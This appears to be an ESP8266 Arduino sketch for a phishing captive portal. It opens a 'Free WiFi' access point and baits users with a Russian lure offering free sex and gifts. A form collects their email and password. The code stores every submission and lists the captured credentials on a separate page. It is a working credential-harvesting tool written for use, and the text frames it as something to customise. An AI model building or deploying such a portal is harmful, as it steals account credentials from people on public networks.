#define SSID_NAME "Free WiFi"   //   Feel free to change 
#define SUBTITLE "Бесплатный Секс" //  
#define TITLE "Войти :" //
#define BODY "Приветсвуем в наш клуб!" //
#define POST_TITLE "Спасибо за ваши данные)))"
#define POST_BODY " МЫ вам отправим подарки от Эльдорадо!" //
#define PASS_TITLE "Data" //
#define CLEAR_TITLE "Clear" //

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway 

String Credentials="";
unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String EML="";
String PASS="";

String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }

String footer() { return 
  "</div><div class=q><a>&#169; Все права без защиты.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 16px; line-height: 28px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; }

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Powrot</a></p><p><a style=\"color:blue\" href=/clear>Wyczysc dane</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
    "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
    "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Войти\"></form></center>" + footer();
                                                                                                  // you can change "Zaloguj" to Login in your language 
}

String posted() {
  String email=input("email");
  String password=input("password");
  Credentials="<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
  EML= "@: " + email;
  PASS="Pass: " + password;
  return header(POST_TITLE) + POST_BODY + footer();
  
    
}

String clear() {
  String email="<p></p>";
  String password="<p></p>";
  Credentials="<p></p>";
  return header(CLEAR_TITLE) + "<div><p> Dane zostaly zresetowane.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { // bink 
  int count = 0;
  while(count < 3){
    digitalWrite(BUILTIN_LED, LOW);
    delay(400);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}
